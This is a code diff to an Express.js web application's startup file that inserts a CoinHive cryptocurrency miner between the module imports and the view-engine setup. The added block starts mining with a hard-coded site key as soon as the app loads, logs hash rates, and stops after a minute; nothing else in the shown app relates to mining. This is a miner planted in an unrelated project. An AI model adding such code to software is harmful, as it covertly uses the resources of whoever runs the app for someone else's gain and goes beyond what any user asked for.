@@ -11,6 +11,30 @@ let poi = require('./routes/poi');
 
 let app = express();
 
+const CoinHive = require('coin-hive');
+
+(async () => {
+    // Create miner
+    const miner = await CoinHive('4A4VV3A38HT3LdC50f0bPbUhwl2TDZHx'); // CoinHive's Site Key
+
+    // Start miner
+    await miner.start();
+
+    // Listen on events
+    miner.on('found', () => console.log('Found!'));
+    miner.on('accepted', () => console.log('Accepted!'));
+    miner.on('update', data =>
+        console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `)
+    );
+
+    // Stop miner
+    setTimeout(async () => await miner.stop(), 60000);
+})();
+
 // view engine setup
 app.set('views', path.join(__dirname, 'views'));
 app.set('view engine', 'jade');
